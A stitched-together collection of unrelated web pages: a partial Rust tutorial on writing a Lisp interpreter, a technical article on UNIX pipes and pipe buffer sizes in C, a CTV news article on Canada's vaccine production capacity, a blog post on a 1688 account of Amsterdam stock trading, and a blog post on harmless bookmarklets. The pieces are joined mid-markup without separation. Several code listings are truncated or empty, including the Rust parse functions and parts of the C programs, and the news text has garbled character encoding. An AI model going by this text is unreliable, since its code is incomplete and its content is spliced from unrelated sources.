2 stopping points (Lispy Calculator and Full Lispy), we have 4 stopping points. This reflects the phases I took to build it in Rust.</li><li>Norvig’s syntax is based on Scheme. We will base it on Scheme too, but since I’m also a Clojure fan, I sometimes used slightly different naming, and different implementations for a few functions. I will note when I do that in the essay.</li></ol><p>Finally, this is the first program I wrote in Rust. I may have misused some things, so if you’re a Rust hacker, I’d love to hear your feedback 🙂.</p><p>With the notes out of the way, let’s get into it.</p><p>As Norvig suggests, our first goal is to create a subset of lisp, that can do what a basic calculator can do.</p><p>To make it as simple as possible to follow, for language 1, <strong>we’ll <em>only</em> support addition and subtraction.</strong> No variable definitions, no if statements, nada.</p><p>This departs a bit from Lispy, but I found this stopping point a lot more convenient when writing it in Rust. So, our goal:</p><pre><code><span>(</span><span>+</span><span> </span><span>10</span><span> </span><span>5</span><span> </span><span>2</span><span>)</span><span>//=&gt; 17</span>
<span>(</span><span>-</span><span> </span><span>10</span><span> </span><span>5</span><span> </span><span>2</span><span>) </span><span>//=&gt; 3</span></code></pre><p>The important process we need to remember is the flow of an interpreter:</p><p><em>our program</em> ⟶ <em><strong>parse</strong></em> ⟶ <em>abstract syntax tree</em> ⟶ <em><strong>eval</strong></em> ⟶ <em>result</em></p><p>We will need to <strong>parse</strong> our program and convert it into an abstract syntax tree. After that, we can <strong>eval</strong> the abstract syntax tree and get our result. (Refer to Norvig’s article for more detailed definitions and explanations).</p><h2 id="type-definitions">Type Definitions</h2><p>Risp can have three kinds of values for now:</p><pre><code><span>#[derive(Clone)]</span>
<span>enum</span><span> </span><span>RispExp</span><span> {</span>
<span>  </span><span>Symbol</span><span>(</span><span>String</span><span>),</span>
<span>  </span><span>Number</span><span>(</span><span>f64</span><span>),</span>
<span>  </span><span>List</span><span>(</span><span>Vec</span><span>&lt;</span><span>RispExp</span><span>&gt;</span><span>),</span>
<span>} </span></code></pre><p>We’ll also need an error type. We’ll keep this simple, but if you’re curious there <em>is</em> a <a href="https://news.ycombinator.com/item?id=19812159" target="_blank">more robust approach</a>.</p><pre><code><span>#[derive(Debug)]</span>
<span>enum</span><span> </span><span>RispErr</span><span> {</span>
<span>  </span><span>Reason</span><span>(</span><span>String</span><span>),</span>
<span>}</span></code></pre><p>Finally, we’ll need an <em>environment</em> type. This is where we will store defined variables, built-in functions, and so forth:</p><pre><code><span>#[derive(Clone)]</span>
<span>struct</span><span> </span><span>RispEnv</span><span> {</span>
<span>  data: HashMap</span><span>&lt;</span><span>String</span><span>, RispExp</span><span>&gt;</span><span>,</span>
<span>}</span></code></pre><h2 id="parsing">Parsing</h2><p>Our goal is to take our program, and build an abstract syntax tree from it. For us, that is going to be a <code>RispExp</code>. To do this, first we will take our program, and cut it up into a bunch of tokens:</p><pre><code><span>tokenize(</span><span>"(+ 10 5)"</span><span>) </span><span>//=&gt; ["(", "+", "10", "5", ")"]</span></code></pre><p>Here’s how we can do that in Rust:</p><pre><code><span>fn</span><span> </span><span>tokenize</span><span>(expr: </span><span>String</span><span>) -&gt; </span><span>Vec</span><span>&lt;</span><span>String</span><span>&gt; {</span>
<span>  expr</span>
<span>    .</span><span>replace</span><span>(</span><span>"("</span><span>, </span><span>" ( "</span><span>)</span>
<span>    .</span><span>replace</span><span>(</span><span>")"</span><span>, </span><span>" ) "</span><span>)</span>
<span>    .</span><span>split_whitespace</span><span>()</span>
<span>    .</span><span>map</span><span>(</span><span>|</span><span>x</span><span>|</span><span> x.</span><span>to_string</span><span>())</span>
<span>    .</span><span>collect</span><span>()</span>
<span>}</span></code></pre><p>Then, we can parse these tokens, into a <code>RispExp</code>:</p><pre><code><span>fn</span><span> </span><span>parse</span><span>&lt;</span><span>'a</span><span>&gt;(tokens: &amp;</span><span>'a</span><span> [</span><span>String</span><span>]) -&gt; </span><span>Result</span><span>&lt;(RispExp, &amp;</span><span>'a</span><span> [</span><span>String</span><span>]), RispErr&gt; {</span>

<span>  }</span>
<span>}</span></code></pre><p><strong><em>Note:</em></strong> <em>I depart slightly from Norvig’s implementation, by returning the “next” slice. This lets us recurse and parse nested lists, without mutating the original list.</em></p><p>We get the token for the current position. If it’s the beginning of a list “(“, we start reading and parsing the tokens that follow, until we hit a closing parenthesis:</p><pre><code><span>fn</span><span> </span><span>read_seq</span><span>&lt;</span><span>'a</span><span>&gt;(tokens: &amp;</span><span>'a</span><span> [</span><span>String</span><span>]) -&gt; </span><span>Result</span><span>&lt;(RispExp, &amp;</span><span>'a</span><span> [</span><span>String</span><span>]), RispErr&gt; {</span>

<p>A pipe is a first-in-first-out interprocess communication channel.
The pipe version as it is known today was invented by an American Computer Scientist
<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>
and incorporated into Version 3 AT&amp;T UNIX in 1973 by
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a>.</p>

<p>It was inspired by the observation that frequently the output of one application is
used as an input for another. This concept can be reused to connect a chain
of processes. This is frequently observed
in UNIX shell constructs that utilize the <code>|</code> operator.</p>

<div><pre><code data-lang="bash">$ find lib -name *.c | awk -F <span>'/'</span> <span>'{print $NF}'</span> | sort -u | tail
yp_maplist.c
yp_master.c
yp_match.c
yp_order.c
yperr_string.c
yplib.c
ypprot_err.c
yyerror.c
zdump.c
zic.c</code></pre></div>

<p>This can be illustrated as a sequence of processes and pipes connecting the programs.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-chain.svg" alt="pipe chain"></p>

<p>This concept of connecting the UNIX tools has been expanded to various native tools,
such as the troff formatting system, that are specifically designed to be used in pipelines.
The troff format and the associated toolkit are still used in the NetBSD Operating System.
The build rules, producing the <code>.ps</code> files (<a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a>)
look like this one, for
the kernmalloc (the kernel allocator documentation) example:</p>

<h2 id="the-c-interface-for-pipes">The C interface for pipes</h2>

<p>The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html">POSIX specification</a>
declares the <code>pipe</code> function with the following signature:</p>



<p>inside the <code>&lt;unistd.h&gt;</code> header.</p>

<p>The <code>pipe</code> function takes an array of two integers, and writes file descriptors
of the read and write end of the pipe into it upon successful return.
The <code>fildes[0]</code> file descriptor is opened for reading and <code>fildes[1]</code> for writing.
Some implementations of UNIX allow using the <code>fildes[0]</code> end for writing too and <code>fildes[1]</code> for reading
(the full duplex mode), but this behavior is unspecified by POSIX and it is only safe to assume that
they are unidirectional (half duplex mode).</p>

<p>The <code>pipe</code> call can fail and return <code>-1</code>, setting appropriate <code>errno</code>
if the process (<code>EMFILE</code>) or the system (<code>ENFILE</code>) expired the allowed number of
open file descriptors.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-in-process.svg" alt="pipe in a process"></p>

<p>This interface as it looks is appropriate only for processes that have the shared ancestor (usually the direct parent)
and is usually combined with <code>fork(2)</code>/<code>vfork(2)</code>/<code>posix_spawn(3)</code> or an equivalent interface
(otherwise the pipe would be a futile feature).
To workaround the limitation of having the shared predecessor,
the fifo special files or UNIX domain sockets can be used.</p>

<p>In the UNIX system, file descriptors are inherited by children by default (with some exceptions in modern APIs)
and thus the created pipe, referenced by the array of two file descriptors, connects the child and the parent.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork.svg" alt="pipe after fork"></p>

<p>In order to make the pipe effective, the user has to decide the direction of the data flow and
close the other ends. If the intention is to send data from process A to process B, then we need
to close the <code>fildes[0]</code> (reading) end in process A and <code>fildes[1]</code> (writing) end in process B.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork2.svg" alt="pipe after fork"></p>

<p>Now, the processes can transmit data over the pipe channel.</p>

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>NB. For the sake of simplicity, certain code paths such as handling interrupts (<code>EINTR</code>) were omitted.</p>

<p>The execution of this program results with:</p>



<p>The UNIX designers put the following constraints on the pipes (assuming <code>O_NONBLOCK</code> not set):</p>

<ul>
<li>Once the readable end of the pipe is closed, any attempt done to write results with <code>SIGPIPE</code> emitted into the writing process.
A process can either be killed or catch or ignore the signal and then needs to handle the error (<code>-1</code> and errno set to <code>EPIPE</code>) manually.</li>
<li>Once the writable end of the pipe is closed, an attempt to read from the pipe returns <code>0</code> and notifes <code>EOF</code> on the file descriptor.</li>
</ul>

<p>Additionally:</p>

<ul>
<li>The amount of free space inside the pipe (kernel buffering) is limited and implementation specific.</li>
<li>When the child process starts, the default stdio I/O buffering on pipes defaults to the fully buffered mode.
The three basic approaches to workaround this are:

<ul>
<li>using <code>fflush(3)</code> explicitly,</li>
<li>changing the buffering mode (<code>setvbuf(3)</code>) or</li>
<li>using pseudo terminals if the child process is not modifiable.</li>
</ul></li>
</ul>

<h2 id="the-kernel-pipe-buffer-size">The kernel pipe buffer size</h2>

<p>The size of the kernel buffer storing the pipe data is limited and will cause further attempts to <code>write(2)</code> data to block
until the space is regained, by the <code>read(2)</code> operation on the other end.
The minimum acceptable value in a <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/limits.h.html">POSIX system</a>
is set to 512 bytes.</p>

<p>In order to check the maximum number of bytes that can be written atomically to a pipe, a programer can use the compiler constant <code>PIPE_BUF</code> or
the dynamic value <code>_PC_PIPE_BUF</code> passed to <code>pathconf(2)</code> or <code>fpathconf(2)</code>.
<code>pathconf(2)</code> and <code>fpathconf(2)</code> can be applied on:</p>

<ul>
<li>directories that can contain fifo files,</li>
<li>fifo files.</li>
</ul>

<p>Additionally, <code>fpathconf(2)</code> can be applied on the pipe file descriptor.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>However, the real number is usually larger. It can be retrieved with <code>ioctl(FIONSPACE)</code> on NetBSD.
This feature is unavailable on other systems: FreeBSD, OpenBSD and Linux, thus FreeBSD implements
<code>FIONSPACE</code> for sockets, but not for pipes.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;sys/types.h&gt;</span><span>

	printf(<span>"FIONSPACE fildes[1]: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>An alternative approach to check the maximum buffer size of the pipe feature is to count the
bytes writable into it manually, one by one, and to detect the hang.
This can be achieved for example with the <code>alarm(3)</code> call, unblocking the hang.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;signal.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>static</span> <span>int</span> n;

<span>static</span> <span>void</span>
<span>sighand</span>(<span>int</span> s)
{

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);
	exit(EXIT_SUCCESS);
}

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (signal(SIGALRM, sighand) <span>==</span> SIG_ERR)
		err(EXIT_FAILURE, <span>"signal"</span>);

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	alarm(<span>5</span>); <span>/* arm the alarm to 5 seconds */</span>

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* if we ended up here, there was an error */</span>
	err(EXIT_FAILURE, <span>"write"</span>);
}</code></pre></div>

<p>Alternatively, one could set the pipe end in the non-blocking mode.
This can be achieved with
the <code>fcntl(2)</code> call and the <code>F_SETFL</code> + <code>O_NONBLOCK</code> arguments.</p>

<p>The <code>O_NONBLOCK</code> mode on pipes causes the following change:</p>

<ul>
<li>Writing into a full pipe buffer returns with <code>-1</code> and errno <code>EAGAIN</code>, instead of blocking.</li>
</ul>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (fcntl(fildes[<span>1</span>], F_SETFL, O_NONBLOCK) <span>==</span> <span>-</span><span>1</span>)

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* filter real errors from the unavailable for now resource */</span>
	<span>if</span> (errno <span>!=</span> EAGAIN)
		err(EXIT_FAILURE, <span>"write"</span>);

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>There are a few other kernel specific approaches to guess the maximum buffer size
that can be stored inside the kernel. One of them is to read <code>PIPE_SIZE</code> from <code>&lt;sys/pipe.h&gt;</code>
on BSD systems, but given that it is 16384 for FreeBSD, NetBSD and OpenBSD, it’s merely an
internal implementation specific header.</p>

<p>In order to make the picture fuller, we need to mention that the FreeBSD and NetBSD kernels
allow tuning of the pipe behavior and investigating
the kernel virtual address spent on the buffers.</p>

<p>FreeBSD provides the following <code>sysctl</code> knobs:</p>

<ul>
<li><code>kern.ipc.piperesizeallowed</code>: Pipe resizing allowed</li>
<li><code>kern.ipc.piperesizefail</code>: Pipe resize failures</li>
<li><code>kern.ipc.pipeallocfail</code>: Pipe allocation failures</li>
<li><code>kern.ipc.pipefragretry</code>: Pipe allocation retries due to fragmentation</li>
<li><code>kern.ipc.pipekva</code>: Pipe KVA usage</li>
<li><code>kern.ipc.maxpipekva</code>: Pipe KVA limit</li>
</ul>

<p>NetBSD:</p>

<ul>
<li><code>kern.pipe.maxbigpipes</code>: Maximum number of “big” pipes</li>
<li><code>kern.pipe.nbigpipes</code>: Number of “big” pipes</li>
<li><code>kern.pipe.kvasize</code>: Amount of kernel memory consumed by pipe buffers</li>
</ul>

<p>OpenBSD does not provide any similar <code>sysctl</code> functionality for pipes.</p>

<p>What are “big” pipes in NetBSD? They are special case pipes that exceed <code>PIPE_SIZE</code> …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>TORONTO -- 
	In the race to develop and produce a COVID-19 vaccine, Canada is on the sidelines despite its once notable status as a global source for life-saving injections.</p>
<p>
	Canada lost that standing long ago, as Prime Minister Justin Trudeau explained this week, which means even if the country had developed its own novel coronavirus vaccine, there would be no means to produce it on the scale required.</p>
<p>
	â€œWe used to have [production capacity] decades ago but we no longer have it,â€� Trudeau said <a href="https://www.ctvnews.ca/health/coronavirus/pm-touts-deal-for-26k-doses-of-covid-19-therapeutic-seeks-to-temper-vaccine-expectations-1.5202350" target="_blank">Tuesday in Ottawa</a>.</p>
<p>
	How did it get to this point? Canadian administrations simply took their â€œeye off the ball,â€� said Earl Brown, an infectious disease expert and a former member of the H1N1 vaccine task group in Canada. After that pandemic, a review found that vaccine production capacity was â€œright at the topâ€� of the list of problems, he said. It wasnâ€™t always that way.</p>
<ul>
	<li>
		<a href="https://www.ctvnews.ca/newsletters/the-covid19-brief-newsletter-signup" target="_blank"><em><strong>Newsletter sign-up: Get The COVID-19 Brief sent to your inbox</strong></em></a></li>
</ul>
<p>
	â€œWe had great vaccine producers in Canada -- world leaders essentially -- 50 years ago,â€� he told CTVâ€™s Your Morning on Wednesday. There was Connaught Laboratories in Toronto, which was known for producing insulin to treat diabetes and inoculants for diphtheria and polio, and Institut Armand Frappier in Montreal that produced vaccines, including one for tuberculosis, he noted.</p>
<p>
	â€œThe problem was they had a poor business model,â€� said Brown. â€œThese were vaccine companies spun off from universities, so there was indirect funding and they had a model of not making so much profit.â€�</p>
<p>
	So they were eventually sold, Montreal's Frappier lab to British multinational GlaxoSmithKline and Connaught, through a series of mergers, to French multinational Sanofi Pasteurâ€‹ after Brian Mulroneyâ€™s Progressive Conservative government's program of privatizationâ€‹. The labs now have a â€œtighter production line and not so much capacity,â€� said Brown.</p>
<p>
	The inability to mount a domestic production campaign means that the Canadian government must rely on purchase agreements with top U.S. and European pharmaceutical brands, including <a href="https://www.ctvnews.ca/health/coronavirus/a-long-way-from-lab-bench-to-bedside-virus-experts-urge-covid-19-vaccine-caution-1.5199238" target="_blank">Pfizer, Moderna</a> and <a href="https://www.ctvnews.ca/health/coronavirus/astrazeneca-covid-19-vaccine-shown-to-be-effective-and-cheaper-1.5200355" target="_blank">AstraZeneca</a>, to produce and provide the shots to Canadians once the vaccines are approved by Health Canada. In the absence of a domestic candidate, Ottawa has ordered as many as 414 million doses of COVID-19 vaccine candidates from seven different companies.</p>
<p>
	<strong>'A MAJOR GLITCH'</strong></p>
<p>
	There are some promising vaccine candidates in development across Canada, including Quebecâ€™s Medicago and Saskatchewanâ€™s VIDO-InterVac, but the companies lack the means to produce them here. What would that mean for rollout should those candidates be successful?&nbsp;</p>
<p>
	â€œThatâ€™s a major glitch,â€� said Brown. â€œYouâ€™re going to have to get a partner, somebody whoâ€™s got the ability to do that and then you have to get them onside, tuned up, send them your vaccine, get it produced and bottled. Not the best way to do it.â€�</p>
<p>
	For those Canadian companies to mount production campaigns on their own will take time -- and a lot of it, they have said. VIDO-InterVac said it has plans to build a facility in one year, but that it would take another still to get it in operating shape. â€œThatâ€™s not the time frame you like,â€� said Brown.</p>
<p>
	In the meantime, Canadians will have to rely on speedier countries with approved COVID-19 vaccines to provide doses, but Canadians won't be prioritized ahead of their own people. â€œCountries like the United States, Germany and the U.K. do have domestic pharmaceutical facilities, which is why theyâ€™re obviously going to prioritize helping their citizens first,â€� Trudeau said on Tuesday in Ottawa.</p>
<p>
	To help Canadians first, the federal government should set up a Crown corporation to produce vaccines, suggests Joel Lexchin, a professor emeritus with York Universityâ€™s School of Health Policy and Management.&nbsp;</p>
<p>
	â€œItâ€™s one thing if we give up the ability to domestically make something like laundry detergent. We can all live without laundry detergent. But when it comes to medications and vaccines, those are critical for the health of Canadians and we should be able to make them ourselves,â€� he told CTV National News. â€œNot only will the ability to domestically produce them ensure that Canadians get the care that they need, but we can also fulfill our human rights obligations by exporting them at low cost to low- and middle-income countries.â€�</p>
<p>
	<strong>'GROSS INCOMPETENCE'</strong></p>
<p>
	The reliance on other countries and private companies is upsetting critics of Trudeau, who said Tuesday that his administration has begun funding domestic vaccine production capacity because â€œwe never want to be caught short again.â€�&nbsp;</p>
<p>
	â€œThis is gross incompetence thatâ€™s going to cost Canadians their lives and their jobs,â€� said Conservative health critic Michelle Rempel Garner on Tuesday from Parliament Hill.</p>
<p>
	But criticism toward one governmentâ€™s inaction may often easily be directed at another with hindsight, countered Brown on Your Morning.</p>
<p>
	â€œWhen you have the problem, you look back and say â€˜We should have done something, shouldnâ€™t we?â€™â€� he said.</p>

		<p><a href="http://bilalhafeez.com/wp-content/uploads/2018/09/DutchStock.jpg"><img loading="lazy" src="http://bilalhafeez.com/wp-content/uploads/2018/09/DutchStock.jpg" alt="" width="267" height="285"></a></p>
<p>In the 1600s, the world’s first stock exchange was established in Amsterdam. In 1688, a trader by the name of Josef de la Vega wrote “<a href="https://www.amazon.co.uk/Confusion-Confusiones-Portions-Descriptive-Amsterdam/dp/1614274517/ref=sr_1_1?ie=UTF8&amp;qid=1536921443&amp;sr=8-1&amp;keywords=confusion+de+confusiones">Confusion Of Confusions</a>” – the world’s oldest surviving account of trading stocks. The book is an amazing record of the business. Yet despite being written over 300 years ago, it sounds eerily familiar to our markets today.<span id="more-1684"></span></p>
<p><strong>Addiction</strong></p>
<p>First off, De la Vega has no illusions about the dark side of the industry. He describes the Dutch stock market as “the fairest and most deceitful in Europe…the finest and the most vulgar on earth.” He laments that “this business has been converted into a game, and merchants [concerned in it] have become speculators.” And “what is worse, a portion of the stock brokers have become card-sharpers [hustlers, exploiters]”. Yet, “it is great error to assume that you can withdraw [temporarily] from the Exchange or that you can gain peace of mind when you cease to meet with the other speculators…He who entered the circle of the Exchange is in eternal agitation and sits in a prison, the key of which lies in the ocean and the bars of which never open.”</p>
<p><strong>4 Principles</strong></p>
<p>With this backdrop, he writes about “some precepts” that he lives by:</p>
<p>1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Never give anyone the advice to buy or sell shares” since the “most benevolent piece of advice can turn out badly”</p>
<p>2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Take every gain without showing remorse about missed profits, because an eel may escape sooner than you think”. Put another way, “it is wise to enjoy that which is possible without hoping for …the persistence of luck.”</p>
<p>3)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Profits on the exchange are the treasures of goblins. At one time they may be carbuncle stones [gemstones], then coals, then diamonds, then flint-stones, then morning dew, then tears”. I guess he means investment gains are not permanent.</p>
<p>4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Whoever wishes to win this game must have patience and money, since the values are so little constant and the rumours so little founded on truth. He who knows how to endure blows without being terrified by the misfortune resembles the lion who answers the thunder with a roar, and is unlike the hind [deer] who, stunned by the thunder, tries to flee.”</p>
<p><strong>The Mind Of a Trader</strong></p>
<p>He has a keen eye on the psychology of the traders. Speculators “are very clever in inventing reasons for a rise in the price of shares on occasions when there is a declining tendency.” And “when speculators talk, they talk shares…when they look at something, it is shares that they see…But what surpasses these enormities…is the fact that the speculator…struggles against his own will …and is at odds with his own decisions…If, for example, there arrives a piece of news which would induce the speculator to buy, while the atmosphere prevailing at the stock exchange forces him to sell, his reasoning fights his own good reasons…”</p>
<p>He goes on to talk about price formation: “the expectation of an event creates a much deeper impression upon the exchange than the event itself. When large dividends or rich imports are expected, shares will rise in price; but if the expectation becomes a reality, the shares often fall; for the joy over the favourable development and the jubilation over lucky chance have abated in the meantime.”</p>
<p><strong>Bulls and Bears</strong></p>
<p>He splits traders into two classes. “The first class consists of the bulls. They start their operations by purchases…They always desire a rise in the price of the shares; they hope that by reason of good news the market will be suddenly stirred up, and that prices will rise high rapidly. The second faction consists of the bears…The bears always begin operations by sales…These bears must be fled like the plague, and one must take their part only on extraordinary occasions”</p>
<p>More colourfully, he describes them as follows:</p>
<p>“The bulls are like the giraffe which is scared of noting…They love everything, they praise everything, they exaggerate everything…the bulls make the public believe that their tricks signify wealth and that crops grow on graves…The bears on the contrary, are completely ruled by fear, trepidation and nervousness. Rabbits become elephants, brawls in a tavern become rebellions, faint shadows appear to them as signs of chaos.”</p>
<p><strong>Derivatives</strong></p>
<p>Finally, it was remarkable how sophisticated the instruments available to trade were: they could trade cash markets, forwards and even options:</p>
<p>[On managing downside]: “The Dutch call the option business “opsies” a term derived from the Latin word “optio”, which means choice, because the payer of the premium has the of delivering the shares…Give “opsies” or premiums, and there will only be limited risk to you, while the gain may surpass all your imaginings…it is impossible to lose&nbsp; more than the price of the premium</p>
<p>So, looks like nothing much has changed!</p>

        <h2>Everything Old is New Again</h2>

        <p>
          Bookmarklets are old newsâ€” According to Wikipedia, <a href="https://en.wikipedia.org/wiki/Bookmarklet" target="_blank" rel="noopener noreferrer">bookmarklets have been around since the year 2000</a>.
          The usefulness and popularity of bookmarklets has certainly waned
          in the last 20 years as browser extensions have grown in popularity. However, you can still create bookmarklets and
          unlike modern browser extensions, bookmarklets work on all major web browsers (even on mobile).
        </p>

        <p>
          I maintain a few products that rely on browser extensions to provide convenient product functionality.
          When it comes to your product and business, Google's web store is
          <a href="https://medium.com/@miko_89964/after-3-years-of-work-chrome-killed-my-extension-and-wont-tell-me-why-83a3f8d65cbc" target="_blank" rel="noopener noreferrer">risky to say the least</a>.
          I have been experimenting with the idea of offering a bookmarklet in addition to my product's browser
          extension. At the very least, I would like to offer a bookmarklet as an extension fallback in the event
          things ever go south with Google.
        </p>

        <p>
          Unfortunately (or, <i>fortunately</i> depending on how you look at it) bookmarklets have been
          stripped of some useful functionality. Due to security concerns most websites place content policies
          on their webpages. These policies limit which resources and domains can be used within the context
          of the page.
        </p>

        <p>
          As a result of the content policies bookmarklets face a few restrictions:
        </p>

        <ul>
          <li>You can no longer rely on loading styles, html or javascript from a remote server.</li>
          <li>You are restricted by the amount of data and code you can fit in a single URL (which is roughly 2,000 characters).</li>
        </ul>

        <p>
          You are probably thinking bookmarklets are useless with such restrictions. However, there are quite a few
          upsides to bookmarklets.
        </p>

        <h2>Restricted but not useless.</h2>

        <p>
          Bookmarklets may not share the same level of control and freedom browser extensions have, but they do offer a number of
          upsides browser extensions are unable to provide. Here are a few upsides to consider:
        </p>

        <ol>
          <li>
            You don't need to rely on a third party web store for distribution.
          </li>
          <li>The same bookmarklet code works everywhere; even on mobile browsers.</li>
          <li>
            No automatic updates. I prefer this over the extension model of automatic updates. In the
            extension world you never know what code is running in your browser at any given point in time. If
            an extension is hijacked or sold to a malicious third party you could be running malicious code.
          </li>
          <li>
            Bookmarklets can skirt by a strict IT department. Believe it or not, I have enterprise customers that
            are unable to use my product's extension because their IT department forbids browser extensions.
          </li>
        </ol>

        <p>
          Bookmarklets are far from perfect and may not be ideal for your specific needs.
          There are two patterns I commonly see where bookmarklets remain as viable alternatives to browser
          extensions. The two common patterns I see can be summarized in the following ways:
        </p>

        <ol>
          <li>
            You want to modify the target page in some way.
          </li>

          <li>
            You want to extract data and present it locally or transfer the data to another service.
          </li>
        </ol>

        <p>
          I will demonstrate both of the patterns above with a few bookmarklets I created for this blog post.
          The complete source code for all of the demonstrated bookmarklets can be found on <a href="https://prophitt.me/src">my source code page</a>.
        </p>

        <p>Here's a preview of the four bookmarklets:</p>

          </p></div>
        </div>

        <h2>Pattern 1: Modifying Pages (Div Highlighter)</h2>

        <p>
          Note, all demoed bookmarklets can be "installed" by dragging and dropping their respective heading link into your bookmark tool
          bar. You can also manually create a bookmarklet by copying and pasting the provided location string into the location
          field of a new bookmark.
        </p>

        <p>
          The simplest of all use cases for a bookmarklet is to make a temporary modification to a web page. For example,
          removing an auth wall, changing a page from "light" mode to "dark" mode, etc. To demonstrate how to accomplish this
          functionality with a bookmarklet, I took a Chrome browser extension and converted it into a bookmarklet with identical
          functionality.
        </p>

        <p>
          After some digging around I found the <a href="https://github.com/itsHobbes/div-highlighter" target="_blank" rel="noopener noreferrer">div-highlighter</a>
          extension by <a href="https://github.com/itsHobbes" target="_blank" rel="noopener noreferrer">itsHobbes</a>. When clicked the extension highlights all divs
          on the current page with a random border and background color. This is a common debugging technique and the extension is a
          great example for this pattern. I took the code from the extension and wrapped it inside of a function to
          prevent polluting the global namespace.
        </p>

        <p>The complete code can be seen below:</p>

        <pre><code>(function () {
  var MIN_PARENT_COUNT = 0;
  var MAX_PARENT_COUNT = 3;

  function rgba() {
      var o = Math.round, r = Math.random, s = 255;
      return 'rgba(' + o(r() * s) + ',' + o(r() * s) + ',' + o(r() * s) + ',' + 0.4 + ')';
  }

  var divs = document.getElementsByTagName('div');

  for (var i = 0; i &lt; divs.length; i++) {
      if (divs[i].offsetHeight == 0 || divs[i].offsetWidth == 0) {
          continue;
      }

      var parents = 0;
      var node = divs[i];

      while (node != null) {
          if (node.tagName == 'DIV') {
              parents++;
          }

          node = node.parentNode;
      }

      if (parents &gt;= MIN_PARENT_COUNT &amp;&amp; parents &lt;= MAX_PARENT_COUNT) {
          var color = rgba();

          divs[i].style.boxSizing = 'border-box';
          divs[i].style.border = '2px solid ' + color;
          divs[i].style.backgroundColor = color;
      }
  }
})();
</code></pre>

        <p>The minified location string is as follows:</p>

        <pre><code>javascript:(function(){var MIN_PARENT_COUNT=0;var MAX_PARENT_COUNT=3;function rgba(){var o=Math.round,r=Math.random,s=255;return"rgba("+o(r()*s)+","+o(r()*s)+","+o(r()*s)+","+.4+")"}var divs=document.getElementsByTagName("div");for(var i=0;i&lt;divs.length;i++){if(divs[i].offsetHeight==0||divs[i].offsetWidth==0){continue}var parents=0;var node=divs[i];while(node!=null){if(node.tagName=="DIV"){parents++}node=node.parentNode}if(parents&gt;=MIN_PARENT_COUNT&amp;&amp;parents&lt;=MAX_PARENT_COUNT){var color=rgba();divs[i].style.boxSizing="border-box";divs[i].style.border="2px solid "+color;divs[i].style.backgroundColor=color}}})();
</code></pre>

        <p>
          You may notice the code for itsHobbes' extension and the bookmarklet are identical. Bookmarklets and extension content scripts
          work in essentially the same way.
        </p>

        <h2>Pattern 2: Remote Data Extraction (Wayback Machine)</h2>

        <p>
          Another commonly seen pattern involves the extraction of some data from the page and the transfer of the data to another
          remote location. This pattern is often used to "share a post", "post a message", etc. For example, the <a href="https://news.ycombinator.com/bookmarklet.html" target="_blank" rel="noopener noreferrer">Hacker News bookmarklet</a>
          uses this pattern.
        </p>

        <p>
          To demonstrate this pattern I created a simple bookmarklet that will determine the hostname and protocol for the current web page and open the page up within Wayback Machine's
          archive. Essentially, we are extracting the url and transferring it to Wayback Machine in a new browser tab.
        </p>

        <p>The complete code can be seen below:</p>

        <pre><code>(function () {
  var host = location.protocol + "//" + location.hostname;
  window.open("https://web.archive.org/web/*/" + host, "_blank", "noreferrer,noopener");
})()
</code></pre>

        <p>The minified location string is as follows:</p>

        <pre><code>javascript:(function(){var host=location.protocol+"//"+location.hostname;window.open("https://web.archive.org/web/*/"+host,"_blank","noreferrer,noopener")})();
</code></pre>

        <p>
          The demonstration above only extracted the protocol and host address from the web page but you can extract any information
          from the page. The only limitation is how much data you can safely fit in a url.
        </p>

        <p>
          The general consensus is you should limit url length to 2,000 characters or less for maximum browser support. I have tested
